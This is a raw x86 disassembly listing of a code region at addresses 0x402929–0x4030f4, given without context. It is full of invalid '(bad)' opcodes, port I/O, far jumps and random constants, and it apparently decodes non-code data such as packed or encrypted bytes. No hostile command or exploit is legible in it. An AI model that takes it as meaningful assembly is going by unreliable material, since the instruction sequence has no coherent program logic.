  402929:	test   DWORD PTR [ebp-0x360c717c],ecx
  40292f:	retf   0xc064
  402932:	les    ebx,FWORD PTR [edx]
  402934:	(bad)  
  402935:	mov    ?,esp
  402937:	adc    al,dl
  402939:	out    dx,al
  40293a:	xchg   ecx,eax
  40293b:	ficom  WORD PTR [ecx-0x1dce363e]
  402941:	je     0x40295e
  402943:	push   0x59923304
  402948:	pop    ebx
  402949:	popf   
  40294a:	sbb    esi,ecx
  40294c:	in     eax,dx
  40294d:	int3   
  40294e:	test   BYTE PTR [edx-0x1570e7ed],bh
  402954:	inc    ebp
  402955:	push   es
  402956:	cmp    edx,DWORD PTR [edi+0x43]
  402959:	fidivr WORD PTR [esi+0x6319af78]
  40295f:	jle    0x40292f
  402961:	popa   
  402962:	add    BYTE PTR [edx+ecx*2],bh
  402965:	sub    al,0xeb
  402967:	call   0x1b63:0x748ba3c5
  40296e:	les    eax,FWORD PTR [ebp-0xb6d28a1]
  402974:	movq   mm0,QWORD PTR [edi]
  402977:	mov    ds:0xd04c031d,eax
  40297c:	xor    BYTE PTR ds:0x64e9ba55,al
  402982:	int    0xfb
  402984:	push   ss
  402985:	xor    al,0xa8
  402987:	lds    esi,FWORD PTR [edx]
  402989:	sub    eax,DWORD PTR [ecx+eax*4-0x692d812b]
  402990:	fisub  WORD PTR [edx]
  402992:	fld    QWORD PTR [eax+0x1cf08544]
  402998:	aaa    
  402999:	and    dl,bl
  40299b:	scas   al,BYTE PTR es:[edi]
  40299c:	leave  
  40299d:	aam    0xe3
  40299f:	push   ebp
  4029a0:	sub    eax,0x503714c2
  4029a5:	shl    BYTE PTR [edx+edx*2],1
  4029a8:	test   eax,0xafde2319
  4029ad:	pop    ebx
  4029ae:	cmc    
  4029af:	out    dx,al
  4029b0:	cmp    al,0xa
  4029b2:	loopne 0x402995
  4029b4:	(bad)  
  4029b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029b6:	jecxz  0x4029c3
  4029b8:	cmp    cl,BYTE PTR [edx-0x6e48ada6]
  4029be:	pop    ebp
  4029bf:	cmc    
  4029c0:	das    
  4029c1:	cmp    al,0x52
  4029c3:	lods   al,BYTE PTR ds:[esi]
  4029c4:	pop    ds
  4029c5:	iret   
  4029c6:	xor    DWORD PTR [edx+0x33],edi
  4029c9:	stos   DWORD PTR es:[edi],eax
  4029ca:	cld    
  4029cb:	inc    ecx
  4029cc:	sub    DWORD PTR [ebx-0x12],esp
  4029cf:	aad    0x92
  4029d1:	fcmovnu st,st(4)
  4029d3:	mov    DWORD PTR [eax+0x65],esp
  4029d6:	mov    bl,0xff
  4029d8:	les    eax,FWORD PTR [esi+ecx*4+0x7f2c5897]
  4029df:	xchg   edx,eax
  4029e0:	push   ebp
  4029e1:	shl    BYTE PTR [edi+0x2],0xf3
  4029e5:	jbe    0x402a44
  4029e7:	sub    al,0x4a
  4029e9:	xor    DWORD PTR [ebp+0x2b4753cb],esp
  4029ef:	mov    esi,edx
  4029f1:	sub    bl,BYTE PTR [edx-0x6a]
  4029f4:	std    
  4029f5:	push   ebp
  4029f6:	aaa    
  4029f7:	or     eax,0xbb44959d
  4029fc:	fdiv   QWORD PTR [edi-0x7]
  4029ff:	mov    BYTE PTR [edx-0xb],cl
  402a02:	mov    esp,0xe43f8286
  402a07:	inc    ebp
  402a08:	xlat   BYTE PTR ds:[ebx]
  402a09:	mov    ah,0xf5
  402a0b:	(bad)  
  402a0d:	inc    eax
  402a0e:	cmp    BYTE PTR [edx+0xbb27c4e],0xa
  402a15:	sub    BYTE PTR [ebp-0x4d],al
  402a18:	mov    cl,0x9
  402a1a:	inc    eax
  402a1b:	fdivr  DWORD PTR [edx]
  402a1d:	mov    ds:0x2db481d4,al
  402a22:	and    cl,bl
  402a24:	shl    BYTE PTR [ecx+0x10bf599c],1
  402a2a:	mov    ecx,DWORD PTR [edx]
  402a2c:	stos   BYTE PTR es:[edi],al
  402a2d:	xor    DWORD PTR [ecx-0x12],esi
  402a30:	push   ds
  402a31:	add    dl,BYTE PTR ds:0x870c6a1
  402a37:	xchg   edi,eax
  402a38:	ds test al,0x11
  402a3b:	inc    bp
  402a3d:	shr    BYTE PTR [ecx],cl
  402a3f:	bound  eax,QWORD PTR [esi-0x72a445ef]
  402a45:	push   ebx
  402a46:	adc    eax,0x72ff3d94
  402a4b:	and    ecx,ebp
  402a4d:	leave  
  402a4e:	push   edi
  402a4f:	cmp    dl,ch
  402a51:	xchg   esp,ebx
  402a53:	in     eax,dx
  402a54:	test   BYTE PTR [ebp+0x5107bf52],0xe9
  402a5b:	sub    edi,edx
  402a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a5e:	and    al,0x86
  402a60:	add    al,0xcb
  402a62:	idiv   BYTE PTR [ebx+0x5]
  402a65:	mov    esp,0x16688e9d
  402a6a:	stos   BYTE PTR es:[edi],al
  402a6b:	xchg   ebp,eax
  402a6c:	push   es
  402a6d:	iret   
  402a6e:	(bad)  
  402a6f:	loopne 0x402a6e
  402a71:	mov    esi,0x32cfcd91
  402a76:	jbe    0x402a0a
  402a78:	lahf   
  402a79:	xlat   BYTE PTR ds:[ebx]
  402a7a:	mov    cl,0x5b
  402a7c:	inc    edx
  402a7d:	rol    al,0xea
  402a80:	lods   al,BYTE PTR ds:[esi]
  402a81:	pop    eax
  402a82:	cmp    DWORD PTR [edx+esi*8-0x6da455f0],edx
  402a89:	sbb    eax,0xb798e72
  402a8e:	and    dl,BYTE PTR [edi*4-0x26d88760]
  402a95:	push   edi
  402a96:	and    eax,0x3b1654f1
  402a9b:	fisub  WORD PTR [edx+0x3bde9ab7]
  402aa1:	add    al,0xb8
  402aa3:	fsub   st,st(4)
  402aa5:	inc    ebx
  402aa6:	adc    BYTE PTR [edi-0x1e573f50],dh
  402aac:	aas    
  402aad:	js     0x402aca
  402aaf:	mov    ah,ch
  402ab1:	push   ebp
  402ab2:	lahf   
  402ab3:	push   0x4b
  402ab5:	aaa    
  402ab6:	adc    edi,0xffffff91
  402ab9:	push   ds
  402aba:	aas    
  402abb:	mov    eax,ds:0x873c8678
  402ac0:	dec    ebx
  402ac1:	cmp    eax,0xd779664d
  402ac6:	dec    ebx
  402ac7:	pop    ebx
  402ac8:	cmp    eax,0x27c7bf47
  402acd:	nop
  402ace:	pusha  
  402acf:	dec    eax
  402ad0:	pop    ds
  402ad1:	jp     0x402b30
  402ad3:	xchg   edx,eax
  402ad4:	mov    esi,0xe056a9c3
  402ad9:	jl     0x402b21
  402adb:	outs   dx,BYTE PTR ds:[esi]
  402adc:	ret    0x60cd
  402adf:	inc    esi
  402ae0:	jno    0x402b4e
  402ae2:	push   esi
  402ae3:	loope  0x402a95
  402ae5:	ja     0x402aa2
  402ae7:	enter  0xda34,0x6
  402aeb:	mov    eax,ds:0x5305d1ef
  402af0:	or     esi,DWORD PTR gs:[edx-0x19f8319b]
  402af7:	gs jge 0x402aa6
  402afa:	data16 sar al,1
  402afd:	fs sub esi,esp
  402b00:	mov    edi,0x3c46f1d5
  402b05:	paddusb mm5,QWORD PTR [ebp+0x4e80f9ab]
  402b0c:	outs   dx,BYTE PTR ds:[esi]
  402b0d:	and    ebx,DWORD PTR [edi+0x3f]
  402b10:	lds    eax,FWORD PTR [edi-0x160bba2e]
  402b16:	dec    ecx
  402b17:	hlt    
  402b18:	stos   BYTE PTR es:[edi],al
  402b19:	inc    ebx
  402b1a:	shr    DWORD PTR [ebx],1
  402b1c:	xor    BYTE PTR [ebx+0x38],ah
  402b1f:	add    DWORD PTR [esi+0x75],ecx
  402b22:	(bad)  
  402b23:	pop    ebx
  402b24:	mov    ds:0xb9d58013,al
  402b29:	fiadd  DWORD PTR [eax]
  402b2b:	and    eax,0xd9c37ad7
  402b30:	leave  
  402b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b32:	mov    esi,0xfd116695
  402b37:	int3   
  402b38:	sub    al,0x20
  402b3a:	ins    BYTE PTR es:[edi],dx
  402b3b:	cmp    eax,0x959eb6f3
  402b40:	pop    ebx
  402b41:	jae    0x402b1c
  402b43:	sbb    DWORD PTR [ecx],0xdd116760
  402b49:	and    ecx,DWORD PTR [ebp-0x4775f41f]
  402b4f:	test   DWORD PTR [ebx-0x10703d49],esi
  402b55:	mov    bl,0xb3
  402b57:	stos   DWORD PTR es:[edi],eax
  402b58:	pop    DWORD PTR [edx+0x1aa9b6bc]
  402b5e:	fild   WORD PTR ss:[ebx-0x1]
  402b62:	jmp    0x402b34
  402b64:	call   0x1e17730b
  402b69:	jmp    0x85804b6a
  402b6e:	fadd   QWORD PTR [ebx+0x7b3e6b8c]
  402b74:	loop   0x402b57
  402b76:	pushaw 
  402b78:	mov    esp,0x1deec1c1
  402b7d:	mov    dl,0xfe
  402b7f:	ror    BYTE PTR [edi-0x65],cl
  402b82:	fisub  WORD PTR [eax]
  402b84:	mov    ah,0x55
  402b86:	cmp    eax,DWORD PTR [edx+0x6d10a428]
  402b8c:	fdiv   QWORD PTR [edx+0x149aa1f1]
  402b92:	scas   al,BYTE PTR es:[edi]
  402b93:	add    al,0x2d
  402b95:	mov    edx,0xf38b8437
  402b9a:	xor    eax,DWORD PTR [esi-0x36f22e85]
  402ba0:	sub    DWORD PTR [esi],edx
  402ba2:	jnp    0x402bee
  402ba4:	in     al,0x51
  402ba6:	xlat   BYTE PTR ds:[ebx]
  402ba7:	mov    eax,0x992e17e1
  402bac:	js     0x402bb2
  402bae:	sbb    esp,DWORD PTR [edx]
  402bb0:	mov    cl,0x37
  402bb2:	loopne 0x402b48
  402bb4:	or     eax,0x373992b8
  402bb9:	xor    eax,DWORD PTR [ebx]
  402bbb:	ds push edi
  402bbd:	popa   
  402bbe:	sbb    al,0x40
  402bc1:	inc    edx
  402bc2:	lds    ecx,FWORD PTR [esp+edi*2-0x4e1f1460]
  402bc9:	add    esp,DWORD PTR [ecx+0x29898104]
  402bcf:	or     eax,0xb838f6f0
  402bd4:	iret   
  402bd5:	dec    edx
  402bd6:	mov    esp,0xdeac21ff
  402bdb:	scas   eax,DWORD PTR es:[edi]
  402bdc:	daa    
  402bdd:	pop    edi
  402bde:	mov    bl,0xe4
  402be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402be1:	pop    eax
  402be2:	push   eax
  402be3:	mov    ch,ah
  402be5:	push   ebp
  402be6:	inc    ecx
  402be7:	inc    ebp
  402be8:	fnclex 
  402bea:	cld    
  402beb:	cwde   
  402bec:	iret   
  402bed:	in     al,dx
  402bee:	cmp    eax,0x341df5cb
  402bf3:	inc    edi
  402bf4:	cwde   
  402bf5:	mov    BYTE PTR [ebx+0x32],ch
  402bf8:	push   esi
  402bf9:	xor    ch,BYTE PTR ds:0xf4419736
  402bff:	out    0x59,al
  402c01:	pop    ebx
  402c02:	ds inc eax
  402c04:	dec    esp
  402c05:	mov    BYTE PTR [ebp+0x3e92b474],ch
  402c0b:	loopne 0x402c12
  402c0d:	sub    al,0x49
  402c0f:	fwait
  402c10:	or     ebp,ebx
  402c12:	aad    0x23
  402c14:	call   0x42c7:0x4e0253da
  402c1b:	ficomp WORD PTR [ebx]
  402c1d:	ret    0x6ff2
  402c20:	scas   eax,DWORD PTR es:[edi]
  402c21:	loopne 0x402bf3
  402c23:	mov    ecx,0x331fe35a
  402c28:	enter  0x8826,0xf2
  402c2c:	ror    DWORD PTR [edi],cl
  402c2e:	push   0x1
  402c30:	xchg   edi,eax
  402c31:	xchg   ebp,ecx
  402c33:	lods   eax,DWORD PTR ds:[esi]
  402c34:	xchg   ebx,eax
  402c35:	or     bl,dh
  402c37:	mov    ebp,ss
  402c39:	leave  
  402c3a:	jecxz  0x402c3c
  402c3c:	sub    BYTE PTR [ecx+0x59],0xc6
  402c40:	into   
  402c41:	adc    DWORD PTR [eax-0x2f5c92c],edi
  402c47:	dec    esi
  402c48:	retf   
  402c49:	jae    0x402cad
  402c4b:	daa    
  402c4c:	jmp    0x105d209d
  402c51:	test   DWORD PTR [esi+edx*2+0x2d7e076e],esp
  402c58:	cmp    al,0x16
  402c5a:	sbb    al,al
  402c5c:	and    al,0xb2
  402c5e:	dec    ecx
  402c5f:	fist   WORD PTR [edx+0x5d]
  402c62:	fisubr WORD PTR [ebx-0x6a]
  402c65:	adc    eax,0x5cea6261
  402c6a:	xchg   ebx,eax
  402c6b:	fwait
  402c6c:	xlat   BYTE PTR ds:[ebx]
  402c6d:	xlat   BYTE PTR ds:[ebx]
  402c6e:	test   BYTE PTR [esi],dh
  402c70:	jae    0x402ce0
  402c72:	retf   0xc78f
  402c75:	clc    
  402c76:	add    DWORD PTR [ecx+edx*1],esi
  402c79:	add    al,0xec
  402c7b:	xchg   edx,eax
  402c7c:	add    DWORD PTR [edi-0x154a59a0],esi
  402c82:	push   es
  402c83:	(bad)  
  402c84:	mov    ebp,0xde8aff6d
  402c89:	addr16 mov cl,0xe3
  402c8c:	call   0x9a7a:0x3c056756
  402c93:	add    ebp,DWORD PTR [eax-0x3]
  402c96:	popf   
  402c97:	mov    eax,ds:0x93643a84
  402c9c:	jecxz  0x402cd6
  402c9e:	stos   BYTE PTR es:[edi],al
  402c9f:	add    BYTE PTR [edi-0x37e6adee],ch
  402ca5:	mov    ch,BYTE PTR [edi-0x3465f599]
  402cab:	mov    DWORD PTR [ebx],eax
  402cad:	aad    0x2f
  402caf:	sub    DWORD PTR [esi],eax
  402cb1:	push   bp
  402cb3:	sub    eax,0x38f13811
  402cb8:	push   esi
  402cb9:	cmp    DWORD PTR [eax+0x5cc2e374],eax
  402cbf:	sub    al,0xb1
  402cc1:	test   BYTE PTR [edx],0xc8
  402cc4:	mov    ecx,0x422543e1
  402cc9:	retf   0x41e7
  402ccc:	mov    DWORD PTR [ecx+ebx*4-0x4518dd59],edx
  402cd3:	loopne 0x402cf8
  402cd5:	dec    esp
  402cd6:	fwait
  402cd7:	jmp    0x49b3:0x928cb266
  402cde:	adc    esi,eax
  402ce0:	addr16 nop
  402ce2:	push   0x3c
  402ce4:	int3   
  402ce5:	ja     0x402d0a
  402ce7:	arpl   WORD PTR [eax],di
  402ce9:	in     eax,0xe2
  402ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cec:	jne    0x402d0f
  402cee:	out    0x44,al
  402cf0:	fcom   QWORD PTR [ebx+edi*1]
  402cf4:	pushf  
  402cf5:	adc    ecx,DWORD PTR [ebx+0x7e]
  402cf8:	out    0x53,al
  402cfa:	xchg   esi,eax
  402cfb:	loop   0x402d37
  402cfd:	in     al,0x5b
  402cff:	xchg   ch,bh
  402d01:	repnz cmp edi,edi
  402d04:	nop
  402d05:	mov    esp,ebp
  402d07:	out    0x45,al
  402d09:	xchg   edx,eax
  402d0a:	fnsave [edi+0x5e7eea1d]
  402d10:	dec    esi
  402d11:	(bad)  
  402d12:	mov    edx,0x3720d95a
  402d17:	jnp    0x402cfb
  402d19:	rcl    DWORD PTR [esi],0x99
  402d1c:	hlt    
  402d1d:	int    0x71
  402d1f:	xlat   BYTE PTR ds:[ebx]
  402d20:	mov    cs,WORD PTR [ebx-0x7e95beee]
  402d26:	or     edi,DWORD PTR [eax-0x3f]
  402d29:	imul   BYTE PTR [esi]
  402d2b:	jg     0x402cd3
  402d2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d2e:	sub    edx,0x7fc51932
  402d34:	jl     0x402d1a
  402d36:	xabort 0xd8
  402d39:	mov    cl,0x22
  402d3b:	add    DWORD PTR [ecx],esp
  402d3d:	mov    ah,0x1b
  402d3f:	lods   eax,DWORD PTR ds:[esi]
  402d40:	test   edi,esi
  402d42:	xchg   edi,eax
  402d43:	push   ecx
  402d44:	shl    BYTE PTR [ebx-0x80],1
  402d47:	cmp    eax,0x51fdcd54
  402d4c:	jg     0x402d5e
  402d4e:	lods   eax,DWORD PTR ds:[esi]
  402d4f:	and    DWORD PTR [edi],eax
  402d51:	or     eax,0x430cac96
  402d56:	jmp    0x4917d96f
  402d5b:	pop    ss
  402d5c:	sub    ebp,DWORD PTR [edx-0xe]
  402d5f:	ss xchg esi,eax
  402d61:	(bad)  
  402d62:	xor    bl,BYTE PTR [ebp+0x12]
  402d65:	adc    BYTE PTR [edx-0x1f054179],dl
  402d6b:	pop    edi
  402d6c:	cmp    BYTE PTR [ecx-0x77a3bf0c],dl
  402d72:	cs dec esi
  402d74:	xchg   esp,eax
  402d75:	xchg   ebx,eax
  402d76:	inc    esi
  402d77:	lea    edi,[eax-0x731157cd]
  402d7d:	jge    0x402dd7
  402d7f:	aaa    
  402d80:	mov    cl,0x25
  402d82:	xor    al,cl
  402d84:	inc    esp
  402d85:	jae    0x402db0
  402d87:	mov    dh,0x77
  402d89:	xor    DWORD PTR [esi+0x33],esp
  402d8c:	adc    BYTE PTR [ebx+ebx*8+0x2e0d31ac],dl
  402d93:	fnstcw WORD PTR ds:0xa90f0f47
  402d99:	or     BYTE PTR [esi+esi*8+0x5fe95d00],dl
  402da0:	or     eax,0xf0027674
  402da5:	cs pusha 
  402da7:	mov    ds:0x33277669,al
  402dac:	pop    ebp
  402dad:	call   0x86a:0x5c9bf315
  402db4:	push   ebp
  402db5:	adc    al,0xe2
  402db7:	and    al,0x1a
  402db9:	pop    ebp
  402dba:	aad    0x1
  402dbc:	inc    ebx
  402dbd:	icebp  
  402dbe:	enter  0x1398,0xb6
  402dc2:	retf   0xc586
  402dc5:	xor    ch,BYTE PTR [ebp-0x6d60dc75]
  402dcb:	pop    ebx
  402dcc:	nop
  402dcd:	push   eax
  402dce:	sbb    eax,0xd9c3cc45
  402dd3:	lods   al,BYTE PTR ds:[esi]
  402dd4:	(bad)  
  402dd5:	fisubr DWORD PTR [esi+edi*8+0x87328dc]
  402ddc:	sbb    BYTE PTR [ebx-0x43],ch
  402ddf:	sub    DWORD PTR [ecx-0x44],ecx
  402de2:	sub    BYTE PTR [edi+eax*4+0x6d],al
  402de6:	rcr    bh,0xd3
  402de9:	(bad)  
  402dea:	xor    al,0x13
  402dec:	pop    ds
  402ded:	inc    esi
  402dee:	std    
  402def:	out    0xe8,eax
  402df1:	cmp    DWORD PTR [edi],esi
  402df3:	jnp    0x402df0
  402df5:	rcl    ecx,1
  402df7:	sub    edx,eax
  402df9:	je     0x402e3f
  402dfb:	div    BYTE PTR [eax*8-0x1b73f44b]
  402e02:	adc    ecx,DWORD PTR [edi-0x6]
  402e05:	add    eax,0xfeba5cd1
  402e0a:	pop    ebx
  402e0b:	ds std 
  402e0d:	int3   
  402e0e:	sbb    esp,DWORD PTR [edx]
  402e10:	(bad)  
  402e11:	dec    ebx
  402e12:	lds    edx,FWORD PTR ss:[ebp+0x121a1c20]
  402e19:	je     0x402d9e
  402e1b:	push   esp
  402e1c:	and    al,bl
  402e1e:	fadd   QWORD PTR [ebx]
  402e20:	ins    BYTE PTR es:[edi],dx
  402e21:	push   esi
  402e22:	jg     0x402e7b
  402e24:	mov    ebx,DWORD PTR [ebx-0x4d]
  402e27:	in     al,0x49
  402e29:	xchg   esp,eax
  402e2a:	cmp    DWORD PTR [ebx-0x6d],0x38
  402e2e:	push   ds
  402e2f:	(bad)  
  402e30:	test   al,0x22
  402e32:	mov    ds:0x6edbecb,eax
  402e37:	cmc    
  402e38:	push   ebx
  402e39:	jmp    0x402e1c
  402e3b:	out    0x72,eax
  402e3d:	mov    bh,0x6c
  402e3f:	and    al,0xcb
  402e41:	stc    
  402e42:	mov    cl,0xf5
  402e44:	test   eax,0xd2e15220
  402e49:	lds    eax,FWORD PTR [esi]
  402e4b:	xlat   BYTE PTR ds:[ebx]
  402e4c:	mov    fs,ebp
  402e4e:	sbb    BYTE PTR [edi+ecx*4-0x6b2d0f61],ch
  402e55:	xor    BYTE PTR [ecx],bh
  402e57:	mov    esi,0x4606f668
  402e5c:	dec    ebx
  402e5d:	scas   al,BYTE PTR es:[edi]
  402e5e:	outs   dx,BYTE PTR ds:[esi]
  402e5f:	rol    ecx,0xe1
  402e62:	or     DWORD PTR [edi-0x66be56e7],0x5
  402e69:	popf   
  402e6a:	into   
  402e6b:	leave  
  402e6c:	xchg   esp,eax
  402e6d:	sti    
  402e6e:	jne    0x402e15
  402e70:	call   0x9bc5:0xc7858729
  402e77:	ja     0x402e6b
  402e79:	sahf   
  402e7a:	or     ebx,DWORD PTR [ecx+0x19]
  402e7d:	xor    ebx,ebp
  402e7f:	dec    ebp
  402e80:	sti    
  402e81:	mov    BYTE PTR [edx-0x433f5d06],bl
  402e87:	mov    ebp,0x9943a45c
  402e8c:	test   DWORD PTR [ecx],0x38d3bb1b
  402e92:	ffreep st(1)
  402e94:	in     al,dx
  402e95:	xchg   esi,eax
  402e96:	out    0x8,al
  402e98:	les    esp,FWORD PTR [edx+0x74]
  402e9b:	sbb    eax,ebp
  402e9d:	nop
  402e9e:	xchg   ebx,eax
  402e9f:	pop    ds
  402ea0:	dec    esi
  402ea1:	cdq    
  402ea2:	pop    edi
  402ea3:	bound  ebp,QWORD PTR [edx]
  402ea5:	icebp  
  402ea6:	mov    dh,BYTE PTR [ecx]
  402ea8:	ret    0x9f5c
  402eab:	jbe    0x402edd
  402ead:	enter  0x8c5b,0x57
  402eb1:	test   DWORD PTR [ebp+0x228405e7],edi
  402eb7:	jp     0x402e87
  402eb9:	mov    cl,0x36
  402ebb:	das    
  402ebc:	mov    bl,0xf7
  402ebe:	mov    al,ds:0x4ba66091
  402ec3:	or     BYTE PTR [esi+0x67],0x6e
  402ec7:	aaa    
  402ec8:	aad    0xf5
  402eca:	ret    
  402ecb:	xor    BYTE PTR [ecx+0x4c],bh
  402ece:	jne    0x402f10
  402ed0:	(bad)  
  402ed1:	add    al,BYTE PTR ds:[esi+edx*2-0x51]
  402ed6:	mov    ch,0xee
  402ed8:	lods   al,BYTE PTR ds:[esi]
  402ed9:	in     al,dx
  402eda:	daa    
  402edb:	adc    bh,BYTE PTR [edi+edi*8+0x74]
  402edf:	jmp    0x562b:0xe0d3b26f
  402ee6:	push   ds
  402ee7:	fst    DWORD PTR [ebp-0x22]
  402eea:	aaa    
  402eeb:	ins    BYTE PTR es:[edi],dx
  402eec:	inc    esp
  402eed:	cwde   
  402eee:	and    DWORD PTR [edi],ecx
  402ef0:	push   eax
  402ef1:	adc    ecx,edi
  402ef3:	imul   ebx,ecx,0x93fc87c3
  402ef9:	mov    ch,0xbb
  402efb:	xchg   edi,eax
  402efc:	xlat   BYTE PTR ds:[ebx]
  402efd:	sahf   
  402efe:	dec    edi
  402eff:	xlat   BYTE PTR ds:[ebx]
  402f00:	mov    bl,0xad
  402f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f03:	xor    ebx,edi
  402f05:	fsubp  st(6),st
  402f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f08:	jo     0x402f5a
  402f0a:	fnsave [eax]
  402f0c:	jns    0x402f31
  402f0e:	scas   al,BYTE PTR es:[edi]
  402f0f:	leave  
  402f10:	xor    eax,0x159fe69b
  402f15:	adc    ebx,esp
  402f17:	mul    BYTE PTR [ebx+0x17]
  402f1a:	ds lock (bad) 
  402f1d:	fidiv  DWORD PTR [esi]
  402f1f:	clc    
  402f20:	add    ebx,DWORD PTR [ebp+0x55e163b3]
  402f26:	aam    0xe4
  402f28:	iret   
  402f29:	dec    esi
  402f2a:	jp     0x402f1b
  402f2c:	add    BYTE PTR [ebx-0x2a],ah
  402f2f:	xchg   ecx,eax
  402f30:	sbb    cl,BYTE PTR [esi-0x6c0e753]
  402f36:	sub    eax,0xe15649f2
  402f3b:	and    BYTE PTR [ebx+0x297981ec],al
  402f41:	cmp    eax,0x9c15a426
  402f46:	imul   ebp,DWORD PTR [eax+0xc],0x1f
  402f4a:	jl     0x402eff
  402f4c:	out    dx,al
  402f4d:	fs pop edi
  402f4f:	sbb    BYTE PTR [edi+edx*8+0x50],bl
  402f53:	and    ebp,DWORD PTR [eax+0x33]
  402f56:	es test eax,0xcdeed6bb
  402f5c:	jnp    0x402fc7
  402f5e:	mov    eax,ds:0x5dc63814
  402f63:	adc    DWORD PTR [eax-0x74],ebx
  402f66:	nop
  402f67:	rcr    DWORD PTR [esi-0x4c],0x30
  402f6b:	mov    al,0xfb
  402f6d:	mov    WORD PTR [ebx-0x2c],es
  402f70:	add    DWORD PTR [edi+0xb],ebx
  402f73:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f75:	add    al,0x72
  402f77:	out    0xe9,al
  402f79:	rcl    BYTE PTR es:[esi-0x77],cl
  402f7d:	xor    BYTE PTR [ebx-0x2d],bl
  402f80:	xchg   cl,bh
  402f82:	adc    eax,0x75f771dd
  402f87:	cmp    ebx,DWORD PTR [edx-0x5fc41b41]
  402f8d:	cmp    eax,0xaccd9b1b
  402f92:	repnz rcr BYTE PTR [edx+0x2b562176],1
  402f99:	aad    0x98
  402f9b:	push   ds
  402f9c:	add    eax,DWORD PTR [edi]
  402f9e:	es addr16 cwde 
  402fa1:	jae    0x402fd4
  402fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fa4:	and    eax,0x494d817
  402fa9:	adc    BYTE PTR [ebp-0x24],0x1a
  402fad:	mov    esi,ds
  402faf:	adc    dh,BYTE PTR [edi-0xf]
  402fb2:	ds and eax,0xfde203b2
  402fb8:	push   esp
  402fb9:	mov    esi,0xd37345cc
  402fbe:	jnp    0x403023
  402fc0:	add    eax,0x2cd26095
  402fc5:	push   esi
  402fc6:	pop    edi
  402fc7:	pop    esp
  402fc8:	fwait
  402fc9:	das    
  402fca:	mov    al,ds:0xd342e90f
  402fcf:	jmp    0x2ee:0x8cb92787
  402fd6:	push   0xffffffd5
  402fd8:	fwait
  402fd9:	push   ebx
  402fda:	inc    ebp
  402fdb:	cld    
  402fdc:	xor    al,0xaf
  402fde:	mov    esp,esp
  402fe0:	leave  
  402fe1:	mov    esi,0x6b2dd41e
  402fe6:	sub    esp,ebp
  402fe8:	data16 out 0x27,al
  402feb:	mov    ecx,0x705ae06a
  402ff0:	dec    ebx
  402ff1:	loope  0x402fcf
  402ff3:	cmp    eax,DWORD PTR [eax-0x7e]
  402ff6:	xor    DWORD PTR [ebx+0x61c6d584],esi
  402ffc:	mov    edx,0xec37ce5b
  403001:	xor    BYTE PTR [esi-0x48703739],ah
  403007:	lahf   
  403008:	ret    
  403009:	jno    0x403079
  40300b:	call   0x56c7ecf2
  403010:	(bad)
  403013:	mov    dh,0x15
  403015:	xchg   esi,eax
  403016:	(bad)  
  403017:	fisttp DWORD PTR [esi-0x29]
  40301a:	jne    0x403097
  40301c:	cmp    eax,esi
  40301e:	dec    esp
  40301f:	mov    ecx,0xdc4695d7
  403024:	loope  0x402fd7
  403026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403027:	cwde   
  403028:	fs mov edi,0x347dc795
  40302e:	cmp    esi,DWORD PTR [edx]
  403030:	jno    0x402fc3
  403032:	(bad)  
  403033:	enter  0x81f7,0xdb
  403037:	xor    DWORD PTR [edi+0x2],edi
  40303a:	mov    eax,ds:0x71614d60
  40303f:	retf   
  403040:	in     al,0x5f
  403042:	mov    cl,0x36
  403044:	jbe    0x402ff7
  403046:	repz mov eax,ds:0xde2756d9
  40304c:	lds    ecx,FWORD PTR [esi]
  40304e:	gs out dx,eax
  403050:	ja     0x4030c2
  403052:	call   0xdc764a12
  403057:	cmp    al,BYTE PTR [edx-0x1b1be1c7]
  40305d:	push   ebp
  40305e:	jno    0x403055
  403060:	je     0x4030d6
  403062:	rol    BYTE PTR [edi+0x32a0bec1],cl
  403068:	pusha  
  403069:	xchg   ebx,eax
  40306a:	in     eax,dx
  40306b:	jne    0x403068
  40306d:	cmp    BYTE PTR [ecx+0x6f9822d3],0xbe
  403074:	pop    eax
  403075:	es push ebp
  403077:	popf   
  403078:	ror    BYTE PTR [ebx-0x37cb9554],0xa1
  40307f:	mov    eax,ds:0x9307faac
  403084:	sub    BYTE PTR ds:0xc14d4825,bl
  40308a:	das    
  40308b:	not    ah
  40308d:	sub    al,0x41
  40308f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403090:	in     al,0xbd
  403092:	inc    esp
  403093:	xchg   edi,eax
  403094:	or     edi,edx
  403096:	scas   eax,DWORD PTR es:[edi]
  403097:	or     bh,dh
  403099:	(bad)  
  40309c:	and    eax,0xb3ed8860
  4030a1:	imul   esi,DWORD PTR [edx+0x35],0xc6dceaba
  4030a8:	es scas eax,DWORD PTR es:[edi]
  4030aa:	push   cs
  4030ab:	inc    ebp
  4030ac:	not    BYTE PTR [esi]
  4030ae:	popf   
  4030af:	fisubr WORD PTR [ebp+eiz*2+0x6b]
  4030b3:	mov    al,ds:0x8da74ea3
  4030b8:	(bad)  
  4030b9:	xor    eax,DWORD PTR [eax]
  4030bb:	sub    BYTE PTR [eax+0x7323891c],ch
  4030c1:	jo     0x403134
  4030c3:	add    BYTE PTR [ebx+0x67a7a524],0xa6
  4030ca:	aaa    
  4030cb:	xchg   edi,eax
  4030cc:	jmp    0x4030d2
  4030ce:	inc    ebp
  4030cf:	inc    ecx
  4030d0:	rcr    ah,1
  4030d2:	mov    fs,WORD PTR [eax]
  4030d4:	mov    bh,0xf2
  4030d6:	cdq    
  4030d7:	popf   
  4030d8:	scas   eax,DWORD PTR es:[edi]
  4030d9:	nop
  4030da:	mov    ecx,0xde044096
  4030df:	loope  0x4030f7
  4030e1:	or     al,0x2e
  4030e3:	push   esp
  4030e4:	push   ss
  4030e5:	add    DWORD PTR [edi],ecx
  4030e7:	gs js  0x40314c
  4030ea:	pop    ds
  4030eb:	bnd jmp 0xc6e961d6
  4030f1:	push   eax
  4030f2:	or     al,0x77
  4030f4:	or     edi,ebx
